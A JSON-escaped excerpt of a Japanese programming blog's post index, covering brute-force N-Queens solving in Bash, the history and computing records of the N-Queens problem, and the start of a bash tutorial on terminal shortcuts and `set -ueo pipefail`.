\u0026#34;\u0026lt;\u0026gt;１．ブルートフォース（力まかせ探索） N-Queen01()\u0026#34;; N-Queen01 0 5; } # NQ; ８ｘ８の出力結果 参考までに８ｘ８の実行結果は以下のとおりです。\n以下の部分を８とすればよいですね。\n# N-Queen01 0 5; N-Queen01 0 8; 実行方法\n$ bash N-Queens.sh : : : : 16777193: 7 7 7 7 7 7 5 0 16777194: 7 7 7 7 7 7 5 1 16777195: 7 7 7 7 7 7 5 2 16777196: 7 7 7 7 7 7 5 3 16777197: 7 7 7 7 7 7 5 4 16777198: 7 7 7 7 7 7 5 5 16777199: 7 7 7 7 7 7 5 6 16777200: 7 7 7 7 7 7 5 7 16777201: 7 7 7 7 7 7 6 0 16777202: 7 7 7 7 7 7 6 1 16777203: 7 7 7 7 7 7 6 2 16777204: 7 7 7 7 7 7 6 3 16777205: 7 7 7 7 7 7 6 4 16777206: 7 7 7 7 7 7 6 5 16777207: 7 7 7 7 7 7 6 6 16777208: 7 7 7 7 7 7 6 7 16777209: 7 7 7 7 7 7 7 0 16777210: 7 7 7 7 7 7 7 1 16777211: 7 7 7 7 7 7 7 2 16777212: 7 7 7 7 7 7 7 3 16777213: 7 7 7 7 7 7 7 4 16777214: 7 7 7 7 7 7 7 5 16777215: 7 7 7 7 7 7 7 6 16777216: 7 7 7 7 7 7 7 7 real\t43m42.887s user\t42m39.067s sys\t0m41.138s bash-3.2$ ４３分かかりました。^^;\n16777216: 77777777\n16,777,216 １千６百７７万ステップもかかりましたね。\nひとこと 今回は、縦列に一つだけのクイーンを配置するという一つのルールで処理しました。\n次回は、横行に一つだけのクイーンを配置するというルールを追加して処理してみます。\n次回からは以下はだめで\ncolumn(列) row(行)_0___1___2___3___4_ 0|-Q-|-Q-|---|---|---| +-------------------+ 1|---|---|---|---|---| +-------------------+ 2|---|---|---|---|---| +-------------------+ 3|---|---|---|---|---| +-------------------+ 4|---|---|---|---|---| +-------------------+ 以下ならよし、という感じです。\nでは次回をお楽しみに。\ncolumn(列) row(行)_0___1___2___3___4_ 0|-Q-|---|---|---|---| +-------------------+ 1|---|-Q-|---|---|---| +-------------------+ 2|---|---|---|---|---| +-------------------+ 3|---|---|---|---|---| +-------------------+ 4|---|---|---|---|---| +-------------------+ 次の記事\nＮクイーン問題（３）ブルートフォース前夜\nhttps://suzukiiichiro.github.io/posts/2023-02-14-03-n-queens-suzuki/\n過去記事\nN-Queens問題：Ｎクイーン問題（２）ブルートフォース前前夜\nhttps://suzukiiichiro.github.io/posts/2023-02-14-02-n-queens-suzuki/\nN-Queens問題：Ｎクイーン問題（１）について\nhttps://suzukiiichiro.github.io/posts/2023-02-14-01-n-queens-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-02-14T14:56:53+09:00","image":"https://suzukiiichiro.github.io/posts/2023-02-14-02-n-queens-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-02-14-02-n-queens-suzuki/","title":"Ｎクイーン問題（２）ブルートフォース前前夜"},{"content":"エイト・クイーン（Ｎクイーン問題）をBash/Lua/Python/Java/C/OpenCL/CUDAなどあらゆるプログラミング言語でワールドレコード（世界一）に挑戦するサイト\nN-Queens\nhttps://github.com/suzukiiichiro/N-Queens\nＮクイーン問題とは Ｎクイーン問題とは、「8列×8行のチェスボードに8個のクイーンを、互いに効きが当たらないように並べよ」という８クイーン問題のクイーン(N)を、どこまで大きなNまで解を求めることができるかという問題。\ndownload.png Ｎクイーン問題は、1848年から存在し、ガウスなど著名な科学者が研究した工学研究の頂点となる研究である。\n名前の通り８つのクイーンの解を求めるというパズルであり、Ｎクイーンは、エイトクイーンの拡張版で、Nの値は８、９、１０，１１，１２･･･と言った風に増え続け、そのNの値であるボードの解を求めるものである。\nクイーンとは、チェスで使われているクイーンを指し、チェス盤の中で、縦、横、斜めにどこまでも進むことができる駒で、日本の将棋でいう「飛車と角」を合わせた動きとなる。\nqneen.png ８列×８行で構成される一般的なチェスボードにおける8-Queens問題の解は、解の総数は92個である。\nQueensMax_800.svg 比較的単純な問題なので、学部レベルの演習問題として取り上げられることが多い。\nyzWFXo.gif 8-Queens問題程度であれば、人力またはプログラムによる「力まかせ探索」でも解を求めることができるが、\nNQ0Ne.jpg Nが大きくなると解が一気に爆発し、実用的な時間では解けなくなる。\nVW2MV.gif 現在すべての解が判明しているものは、2004年に電気通信大学でIntel Pentium 4 Xeon 2.8GHzのプロセッサを68個搭載するPCクラスタ×20日をかけてn=24を解決し、世界一に、その後2005 年にニッツァ大学でn=25、2009年にドレスデン工科大学で N-26、さらに2016年に同工科大学でN=27の解を求めることに成功している。\nJeffSommers氏のビット演算を用いたエレガントなアルゴリズムに加え、対称解除法、並列処理、部分解合成法、圧縮や枝刈りなど、先端技術でワールドレコードが次々と更新されている。\nwikipedia: エイト・クイーン問題\nhttps://ja.wikipedia.org/wiki/エイト・クイーン\nN 達成日時 組織名 参考情報 N22 JSomers 巧みなビット演算による高速化,上下反転の解を考慮し、探索を半分に削減。Jeff Somers氏がN=23の解を求めるときに使用した解法 N23 takaken JSomers版を高橋謙一郎氏が改良。対称性に着目して代表解のみを探索。再帰呼び出しによるプログラム解毒性の向上。 N24 ２００４年４月１１日 電気通信大学 2004年4月 68CPU x 22日(1,496 CPU日 N24) JSomers版を改良し、７〜２４％の性能向上。電通大でN=24を求めるときに使用した解法 N25 ２００５年６月１１日 ProActive 2005年5月 185 days 4 hours 54 minutes 52 seconds 854 Java grid computation by INRIA, France Real \u0026gt;6 Months Sequential \u0026gt;53 Years http://www-sop.inria.fr/oasis/ProActive2/apps/nqueens25.html N26 ２００９年７月１１日 tu-dresden FPGA ( 1 : 822 2.5 GHz-QuadCore systemsに相当（約176 * 4CPU = 704 CPU)) x ２４０日(168,960 CPU日 N26) 9-month cpmputation of FPGAs completing July 1,2009. Result confirmed by Russian MC# super computing project on August 30,2009. N27 ２０１６年　月　日 tu-dresden https://github.com/preusser/q27 歴史的未解決問題に懸賞金 １０００年を超える歴史を持つボードゲーム「チェス」には単なるゲームの勝敗ではなく、そのルールに即したさまざまなパズルの課題「チェス・プロブレム」が存在しています。\nエイト・クイーンはチェスの駒のうち、8個のクイーンだけを使うパズルなのですが、その規模を大きく拡大して行くと、現代数学における未解決問題となり、1億円の賞金がかかる「P対NP問題」の解明につながるものと考えられています。\ngazou325.jpg 歴史あるチェスのパズル問題が現代数学における未解決問題の解明につながる可能性\nhttp://gigazine.net/news/20170905-million-dollar-chess-problem/\nＮクイーンは今のコンピュータでは絶対解けない。解けたら1億円もらえるよ\nhttps://www.gizmodo.jp/2017/10/eight-queens-puzzle.html\n解けたら賞金1億円！ 数学の7つの未解決問題のひとつ「P≠NP」問題へのアプローチがもたらすもの\nhttps://logmi.jp/tech/articles/45330\n2017 | “Simple” chess puzzle holds key to $1m prize | University of St Andrews\nhttps://www.st-andrews.ac.uk/news/archive/2017/title,1539813,en.php\nCan You Solve the Million-Dollar, Unsolvable Chess Problem? - Atlas Obscura\nhttp://www.atlasobscura.com/articles/queens-puzzle-chess-problem-solution-software\n「エイト・クイーン」は1848年にチェスプレイヤーのマックス・ベッツェルによって提案されたパズル。\n8×8マスのチェス盤の上に、縦横と斜め方向にどこまででも進めるという駒・クイーンを8個並べるというものなのですが、その際には「どの駒も他の駒に取られるような位置においてはいけない」というルールが設定されています。\nqueen.png このルールに従った場合にいくつの正解が存在するのか、長らくの間にわたって謎とされていたのですが、考案から100年以上が経過した1874年にGuntherが行列式を用いて解く方法を提案し、イギリスのグレイシャー(Glaisher)によって全解(基本解)が12個であることを確認しています。\nこの問題は、チェス盤の一辺のマスの数とクイーンの数を同一にしたＮクイーン問題とも呼ばれており、Ｎの数が増えるに連れて飛躍的にその解数が増大することが知られています。\n現時点で、全ての解が判明しているのは、2009年にドレスデン工科大学で計算された「26クイーン」で、その基本解は2789兆7124億6651万289個、転回形などのバリエーション解を含めると、その数は2京2317兆6996億1636万4044個にもなることがわかっています。\nその後、ドレスデン工科大学は、2016年に「27クイーン」を解決しました。\nNQ0Ne.jpg セント・アンドルーズ大学のコンピューターサイエンティストであるIan Gent博士らによる研究チームは、この「Ｎクイーン問題」から派生する「Ｎクイーン穴埋め問題」(n-Queens Completion)パズルの複雑性に関する(PDF http://jair.org/media/5512/live-5512-10126-jair.pdf)論文を作成しています。\nComplexity of n-Queens Completion\nhttps://www-users.york.ac.uk/~pwn503/n-queens-jair.pdf\nＮクイーン穴埋め問題は、チェス盤の上にあらかじめいくつかのクイーンの駒を並べておいた状態で、残りのクイーンを全て埋めるというパズル問題です。\n解決方法 基本的にこの問題を解決するためにはバックトラック法と呼ばれる、いわば「総当たり法」が用いられますが、全ての選択肢を試すためには膨大な時間が必要とされ、しかもマスとクイーンの数が多くなるとその時間は指数関数的に一気に増加します。Gent氏によると、この「n-クイーン穴埋め問題」を素早く解決できるコンピューターやアルゴリズムの開発が進むことで、我々が日々抱えている問題を解決する技術の進化が期待できるとのこと。\n先述のように、現代の科学でも解決できているn-クイーン問題は26×26マスの「26-クイーン」にとどまっており、穴埋め問題であってもそこから先へと進むためには、現在はまだ存在していない新しい技術を開発することが必須となってきます。\nこの問題は、2000年にアメリカのクレイ数学研究所が100万ドル(約1億1000万円)の賞金とともに設定したミレニアム懸賞問題の一つに数えられる「P対NP問題」の証明につなが るものとされています。\nこれは、「答えを見つけるのは難しいかもしれないが、答えがあっているかどうかは素早くチェックできる問題」のことをNP問題、「簡単に素早く解ける問題」のことをP問題とした時に、「素早く解けるP問題はすべて答えを素早く確認できるNP問題である」ことは証明されているが、その逆、つまり「答えを素早く確認できるNP問題はすべて、素早く解けるか？」という問題を証明するというもの。\nこれを解くためには膨大な量の計算を素早く行うことが必要になり、現代のコンピューター技術でも解決までには数万年の時間が必要になると考えられています。\nGooleなどWebを探索すると無数のページがあることがわかる。その中でも充実したサイトを\n紹介したい。おおよそ以下のサイトをかみしめて読み解けば情報は９０％網羅されている。\nN-Queens 問題(Nobuhide Tsudaさん)\nhttp://vivi.dyndns.org/tech/puzzle/NQueen.html\nPuzzle DE Programming(M.Hiroiさん）\nバックトラックとビット演算による高速化\nhttp://www.geocities.jp/m_hiroi/puzzle/nqueens.html\ntakakenさん（高橋謙一郎さん）のページ\nhttp://www.ic-net.or.jp/home/takaken/nt/queen/index.html\nの、みなさんが掲示板で議論している模様(貴重ですね）\nhttp://www2.ic-net.or.jp/~takaken/auto/guest/bbs62.html\nptimal Queens\n英語だが、上記の全てがJavaで書かれていて群を抜いている\nhttp://penguin.ewu.edu/~trolfe/Queens/OptQueen.html\nその他のリンク\nhttps://rosettacode.org/wiki/N-queens_problem\nhttp://www.cc.kyoto-su.ac.jp/~yamada/ap/backtrack.html\nhttp://yucchi.jp/java/java_tip/n_queens_problem/n_queens_problem.html\nhttp://www.shido.info/py/queen_py3.html\nhttp://toraneko75.sakura.ne.jp/wp/?p=223\nhttp://yoshiiz.blog129.fc2.com/blog-entry-380.html\nhttp://nw.tsuda.ac.jp/class/algoB/c6.html\nhttp://www.kawa.net/works/js/8queens/nqueens.html\nhttp://www.yasugi.ai.kyutech.ac.jp/2012/4/nq.html\nhttp://www.neuro.sfc.keio.ac.jp/~masato/jv/nqueen/MPneuron.java\nhttp://fujimura2.fiw-web.net/java/lang/page-20-3.html\nhttps://github.com/pankajmore/DPP/blob/master/EPI/src/puzzles/NQueens.java\nhttp://www.kanadas.com/ccm/queens-sort/index-j.html\nhttp://chiiji.s10.xrea.com/nn/nqueen/nqueenn.shtml\nhttp://www.neuro.sfc.keio.ac.jp/~masato/jv/nqueen/nqueenDemo.htm\nここからは参考情報のメモとして\nN=22発見 JeffSomers\nビットマップを N-Queens に最初に応用したのは Jeff Somers 氏のようだ。\n参照：The N Queens Problem\nhttp://www.jsomers.com/nqueen_demo/nqueens.html(リンク切れのようだ）\nN=24発見 電気通信大学\n2004年、電気通信大学の研究グループが、処理を並列化し\nN=24 の解の個数を世界で初めて発見。\nhttp://www.arch.cs.titech.ac.jp/~kise/nq/\nプレスリリース\nhttp://www.arch.cs.titech.ac.jp/~kise/nq/press-2004-10-05.txt\n電通大が「N-queens」問題の世界記録達成\nhttp://www.itmedia.co.jp/news/articles/0410/06/news079.html\nUniversity of North Texas\nhttp://larc.unt.edu/ian/24queens/\nNQueens問題 ＱＪＨの基本構想は、”部分解から全体解を構成するというアプローチ”（部分解合成法：Ｐａｒts Assembly Approach)です。\nhttp://deepgreen.game.coocan.jp/NQueens/nqueen_index.htm\nN Queens World records\nhttp://www.nqueens.de/sub/WorldRecord.en.html\nN=21-23 computed by Sylvain PION (Sylvain.Pion(AT)sophia.inria.fr) and Joel-Yann FOURRE (Joel-Yann.Fourre(AT)ens.fr).\nN=24 from Kenji KISE (kis(AT)is.uec.ac.jp), Sep 01 2004\nN=25 from Objectweb ProActive INRIA Team (proactive(AT)objectweb.org), Jun 11 2005 [Communicated by Alexandre Di Costanzo (Alexandre.Di_Costanzo(AT)sophia.inria.fr)]. This calculation took about 53 years of CPU time.N=25 has been confirmed by the NTU 25Queen Project at National Taiwan University and Ming Chuan University, led by Yuh-Pyng (Arping) Shieh, Jul 26 2005. This computation took 26613 days CPU time.\nN=26 as calculated by Queens(AT)TUD [http://queens.inf.tu-dresden.de/]. - Thomas B. Preußer, Jul 11 2009\nN=27 as calculated by the Q27 Project [https://github.com/preusser/q27]. - Thomas B. Preußer, Sep 23 2016\nエイト・クイーン（Ｎクイーン問題）を\nBash/Lua/Python/Java/C/OpenCL/CUDAなど\nあらゆる言語で挑戦するサイト\nN-Queens\nhttps://github.com/suzukiiichiro/N-Queens\n次回は、シェルスクリプトでエイト・クイーンを解決・解説していきたいと思います。\n次の記事\nN-Queens問題：Ｎクイーン問題（２）\nhttps://suzukiiichiro.github.io/posts/2023-02-14-02-n-queens-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2023-02-14T12:01:52+09:00","image":"https://suzukiiichiro.github.io/posts/2023-02-14-01-n-queens-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2023-02-14-01-n-queens-suzuki/","title":"Ｎクイーン問題（１）について"},{"content":"シェルスクリプト１０００本ノック これからシェルスクリプトを勉強する人、なんとか本を見ながらかけるようになった人、バリバリ書いてきたけど、まだまだ知らないことがないものかと勉強熱心な人。\nそんな人達のために「シェルスクリプト１０００本ノック」をご紹介します。\n興味のあるトピックを読むのもよし、上から順番に実行を確認して身につけるも良いです。\nじっくりやれば時間もかかりますが、Linuxで生きていくなら知っておいて損のないページです。\n書いてあることを暗記する必要はありません。\nどんなことが書いてあったかを覚えておけばよいです。\n必要になればこのページを開いて探せばよいのですから。\nシェルスクリプトでプログラムを書くにあたって、ちまたの本にはなかなか書いていないTIPSもいくつか紹介します。\nまずは、「ターミナルのTIPS」でキーボードショートカットを覚えましょう。\n「bashのTIPS」は、中級者のbashプログラマにとっても大いに参考になると思います。\n「名著紹介」では、僕がプログラマとしておおいに感銘を受けた一冊のエッセンスをご紹介します。是非購入して購読いただければと思います。UNIXという考え方をしっかり意味のあるこころのある内容で説明してくれた数少ない素晴らしい名著です。\nシェルクスクリプトを作るためにおおよそ必要なコマンドリファレンスをページの中盤から集めてあります。\n特に、シェルスクリプトを支える三本柱であるgrepやawk、sedといったコマンドについては、情報を厚めに入れてあります。\nページ後半には、自作コマンドを数本紹介しています。\nすべてシェルスクリプトで作ってありますので、改造してより良いコマンドに仕上げてもらえれば嬉しいです。\ngrepやawk、sedコマンドなどを駆使したシェルスクリプトでできることは無限です。\nすべてを覚えてしまおうというのはどだい無理なのです。\nまずは、このページのコマンドを順番に実行して、感覚を身につけてください。\n浅くとも何度も繰り返し反復することで、直感的に理解して実行することができます。\nちなみに１０００本というのは勢い余って言っているに過ぎません。\n初稿はだいたい７００本です。\nこれからも内容を充実させていくつもりです。\nでは、シェルスクリプトを楽しんでください！\nターミナルのTIPS Ctrl f カーソル位置を後方に１文字ずつ移動 Ctrl fは、カーソル位置を後方に１文字ずつ移動します。\nCtrl f : カーソル位置を後方に１文字ずつ移動します。 Ctrl b カーソル位置を前方に１文字ずつ移動 Ctrl bは、カーソル位置を前方に１文字ずつ移動します。\nCtrl b : カーソル位置を前方に１文字ずつ移動します。 ヒント 矢印カーソルキーで移動させれば良い話。ではありますが、Ctrl+f,Ctrl+bで移動できるようになると、キーボードのホームポジションから指を離すことなく、素早く移動できます。 Ctrl l 画面をクリアする Ctrl lは、画面がコマンドで一杯になった、ログを出力して画面が埋まってしまう、等の場合、Ctrl lコマンドで画面をクリアすることができます。\n日常的に非常によく使うコマンドです。\nCtrl l : クリアと同等。 ヒント とても頻度の高いキーボードショートカットです。是が非でも覚えておくと良いでしょう。 Ctrl m Enterキーを使わない Ctrl mは、キーボードのEnterキーと同じ挙動です。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl m : Enterと同じ Ctrl n 下矢印キーを使わない Ctrl nは、キーボードの下矢印キーと同様の振る舞いをします。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl n : 下矢印と同じ。 Ctrl p 上矢印キーを使わない Ctrl pは、キーボードの上矢印キーと同様の振る舞いをします。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl p : 上矢印と同じ。 Ctrl r 同じコマンドを再入力しない Ctrl rは、コマンド履歴の後方検索を開始します (後方に移動するには Ctrl r を押し続けます)\nCtrl pやCtrl nで過去のコマンド履歴を順にたどっていってもよいのですが、過去のコマンド履歴を簡単に検索して実行することができます。\nCtrl rを押して、冒頭行から数文字を入力することでマッチする過去のコマンドが表示されます。\nCtrl r : コマンド履歴の後方検索 Ctrl h カーソル位置の手前の文字を削除（BackSpaceキーを使わない） Ctrl hは、キーボードのBackSpace、Macではdeleteキーと同じ挙動です。\nメリットは、指をFとJといったホームポジションから外すことなく操作できることです。\nCtrl h : BackSpaceと同じ。カーソル位置の手前の文字を削除します。 Ctrl a コマンド行先頭へジャンプ Ctrl aは、コマンドの行頭に移動します。\n頻繁に利用される必須のコマンドの1つです。\nCtrl a : 行頭に移動します。 Ctrl e コマンド行末へジャンプ Ctrl e コマンドの行末に移動します。\n頻繁に利用される必須のコマンドの1つです。\nCtrl e : 行末に移動します。 ヒント この３つのキーボードショートカットは、ＰＣのほぼすべてのテキスト列共通で使えます。 Ctrl d カーソル位置の文字を削除（BackSpce/deleteとは異なります） Ctrl dは、カーソルの下の文字を削除します。\nBackSpce/deleteは、カーソル手前の一文字を削除しますが、このコマンドはカーソル位置の文字を削除します。\nCtrl d : カーソル下の文字を削除します。 Ctrl u カーソル位置の手前から行頭までのすべてのテキストを削除 Ctrl uは、行頭まで削除します。\nカーソルの１文字手前から行頭までを削除します。\nCtrl u : カーソル位置の手前から行頭までのすべてのテキストを削除します。 Ctrl k カーソル位置から行末までのすべてのテキストを削除 Ctrl kは、カーソルから行末までのすべてのテキストを削除します。\nvimの Shift dコマンドと同じです。\nCtrl k : カーソルから行末までのすべてのテキストを削除します。 Ctrl x BackSpace カーソル位置から行頭までのすべてのテキストを削除します。 Ctrl x BackSpaceは、行頭からカーソルまでのすべてのテキストを削除します。\nBackSpaceを使わずにCtrl hを使う。とか言っておきながらなんなのですが、便利なので覚えてください。\nCtrl xに続いてBackSpceを押します。\nCtrl x backspace : 行頭からカーソルまでのすべてのテキストを削除します。 ヒント この３つのキーボードショートカットは、ＰＣのほぼすべてのテキスト列共通で使えます。\n消したい場所にカーソルで移動して、消したい文字の数だけDeleteキーを押すという必要がないのです。 Ctrl t 前後の文字を入れ替え Ctrl t は、カーソルの前の文字をカーソルの下の文字と入れ替えます。\n例えば Windows というコマンドを入力したいとします。\nキーボードの入力で Windwos となってしまった場合、wとoを入れ替えたいと考えます。\nこの場合、windwosの o にカーソルを移動して Ctrl t を実行します。\nCtrl t : カーソルの前の文字をカーソルの下の文字と入れ替えます。Esc t を押すと、カーソルの前の 2 つの単語が入れ替えられます。 Ctrl w カーソル位置の手前の単語を切り取り貼り付ける Ctrl wは、カーソルの前の単語を切り取ります。\n切り取った単語はクリップボードの保存されるので、Ctrl y で貼り付ける事ができます。\nCtrl w : カーソルの前の単語を切り取ります。Ctrl y 貼り付けます Ctrl u カーソル位置の手前から行頭を切り取り貼り付けます。 Ctrl uは、カーソル位置の手前から行頭にかけてすべての文字列を切り取ります。\nCtrl yで貼り付ける事ができます。\nCtrl u : カーソルの前の行を切り取ります。次に Ctrl y で貼り付けます ヒント とにかく、ゆっくりとコマンドを入力することです。\n何度も繰り返しゆっくりと実行することで、いずれ素早く実行できるようになります。\n焦ってはいけません。 【超裏技】 Esc #(Shift 3) コマンドライン行をコメントアウトして改行 このTIPSはものすごく便利です。\n必ず覚えておくと良いことがあります。\nまず、ある程度長いコマンドを入力し終わってEnterキーを押して実行しようとしているとします。\n「あ・・」と、気がついて「ディレクトリに入るのを忘れてた」と思い出します。\ncd hoge など、ディレクトリ移動をして、先程の長いコマンドを再入力する。\nこんな面倒なことってよくありますよね。\n一般的な方法 Ctrl a ＋ #(Shift 3) $ ./configure sutasuta hoihoi option=hoge と、入力して、このコマンドラインのカーソル行をCtrl aで先頭に移動して、#(Shift 3)を入力してEnterキーを押す。\nそうすると、コマンドラインは以下のようになります。\n$ #./configure sutasuta hoihoi option=hoge ここで改めて\n$ cd hoge で、ディレクトリに入ってから、Ctrl pで１つ前のコマンドを呼び出して、行頭の#をCtrl dで消します。\n$ #./configure sutasuta hoihoi option=hoge \u0026lt;Ctrl d で行頭の # を消す\u0026gt; $ ./configure sutasuta hoihoi option=hoge \u0026lt;Enterキーで実行\u0026gt; 超裏技 Esc ＋ #（Shift 3） もう少し楽にできるショートカットが用意されています。\nEsc を押し離してから#（Shift+3）を押します。\nすると一瞬でコマンドラインの行頭に # が付与されて改行されます。\nまず、先走ってコマンドラインを入力したとします。\n$ ./configure sutasuta hoihoi option=hoge Esc # でコマンドラインをコメントアウトします。\n$ #./configure sutasuta hoihoi option=hoge その後、あらためてcd hogeでディレクトリ移動\n$ cd hoge Ctrl pで１つ前のコマンドを呼び出して、Ctrl dで行頭の#を消す\n\u0026lt;Ctrl p\u0026gt;で１つ前のコマンドを呼び出す $ #./configure sutasuta hoihoi option=hoge \u0026lt;Ctrl d で行頭の # を消す\u0026gt; $ ./configure sutasuta hoihoi option=hoge \u0026lt;Enterキーで実行\u0026gt; まとめると、\nEsc #でコマンドラインをコメントアウト 何らかの別コマンドを入力 Ctrl pで先程のコマンドラインを呼び出す Ctrl dで行頭の#を削除してEnter ヒント Esc # はコマンドライン全体をコメントアウトして改行するコマンドです。\n一度入力したコマンドを再入力する手間が省けます。 bashのTIPS set -ueo setコマンドで便利にプログラミングする手法を紹介します。古来から伝わる便利な一行です。\n#! /usr/bin/bash set -ueo pipefail set -u : 未定義の変数を使用した箇所でスクリプトが正常終了します。変数名が異なる場合も実行できてしまうなどのありがちがバグを未然に防ぐことができます。\nset -e : スクリプトの実行中にエラーが発生した場合、エラーの箇所でスクリプトの処理が終了します。通常は、エラーが発生しても実行は中断されず、エラー箇所を特定するのはとても大変ですが、set -e オプションを付けておくとエラー箇所の特定が比較的カンタンになります。\nset -o pipefail : コマンド同士の連結にパイプ「｜」を使いますが、パイプ箇所でエラーが発生した場合に、パイプで連結したどのコマンドでエラーが発生したのかを特定することができます。\n上記３つのオプションを結合すると set -ueo pipefailをなります。通常、行頭のシェバン「#!/usr/bin/bash 」の下に一行空行を置き、その下に set -ueo pipefailを書くと良いです。\nヒント とはいいつつ、このオプションを有効にすると、制限がかかるので、最初のうちはオプションを使わずにプログラムを書いて、動くことが確認できたらオプションを有効にして、プログラムが想定通りに動かなかったら、なにがだめだったのかを検証するということを繰り返すことで、しっかりとしたプログラムが書けるようになります。 変数の型を指定する 